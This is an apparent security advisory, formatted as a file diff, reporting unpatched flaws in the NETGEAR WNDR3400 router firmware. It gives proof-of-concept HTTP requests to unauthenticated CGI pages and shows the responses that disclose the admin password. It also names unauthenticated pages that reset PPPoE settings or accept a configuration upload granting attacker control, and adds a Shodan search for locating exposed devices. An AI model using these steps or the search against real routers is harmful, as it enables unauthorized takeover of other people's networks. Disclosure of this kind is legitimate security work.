@@ -1,0 +1,105 @@
+Title: Multiple vulnerabilities in NETGEAR N600 WIRELESS DUAL BAND WNDR3400
+====================================================================================
+Notification Date:  4/14/2014
+Affected Vendor:    NETGEAR N600 WIRELESS DUAL BAND WNDR3400
+Firmware Version: Firmware Version 1.0.0.38 AND BELOW (ALL versions affected)
+Issue Types: password Disclosure File Uploading with AuthPPOPE settings Change
+Discovered by: Santhosh Kumar twitter: @security_b0x
+Issue status: No Patch >From the Vendors.
+grettings: @Anami2111 (anamika singh) -- creator of wihawk
+
+
+
+====================================================================================
+Summary:
+========
+While i was lurking around the Netgear firmware today i came across various tweaking and others i was able to find a password disclosure,File uploading vulnerably which could compromise the entire router.as of now no patch from the vendor.
+
+Password Disclosure:
+====================
+url: server/unauth.cgi?id=393087602
+Generating with the 401 unauthorised error
+poc:
+Host: server:8080
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://server:8080/
+ Connection: keep-alive
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 0<p class="MNUTitle">Router Password Recovered</p>
+
+	<table border="0" cellpadding="0" cellspacing="3" style="width:600px">
+    <col width="200" />
+    <col width="400" />
+	<tr>
+	<td colspan="2" class="MNUText">You have successfully recovered the admin password.</td>
+	</tr>
+	<tr>
+	<td class="MNUText" align="right">Router Admin Username</td>
+	<td class="MNUText" align="left">admin</td>
+	</tr>
+<tr>
+<td class="MNUText" align="right">Router Admin Password</td>
+<td class="MNUText" align="left">password</td>
+</tr>
+\<tr>
+
+poc2:
+
+server:8080/passwordrecovered.cgi?id=1738955828
+
+<tr>
+<td colspan="2" class="MNUText">You have successfully recovered the admin password.</td>
+</tr>
+<tr>
+<td class="MNUText" align="right">Router Admin Username</td>
+<td class="MNUText" align="left">admin</td>
+</tr>
+<tr>
+<td class="MNUText" align="right">Router Admin Password</td>
+	<td class="MNUText" align="left">0514</td>
+</tr>
+<tr>
+<td colspan="2" class="MNUText">You can now log in to the router using username "admin" and this recovered password.</td>
+</tr>
+<tr>
+
+==============================================================================================================================
+
+Ppope account reset:
+
+Netgear runs a utility called "netgear genie" which does not have proper authentication on reaching "genie_pppoe.htm "
+
+which allows to reset the ppoe username which any basic authentication.
+
+http://server/genie_pppoe.htm
+
+==============================================================================================================================
+
+File Upload (router reset):
+
+like the same one above the "http://server/genie_restore.htm"
+
+the config file can be uploaded which leading to reseting the control to attackers username and password.
+
+*.cfg file.
+
+
+==============================================================================================================================
+SHODAN DORK:
+wndr3400: 10198 for wndr3400
+
+
+
+
+
+******************************************************************************************************************************
+
+
+ 
+
+
+
+ 		 	   		  
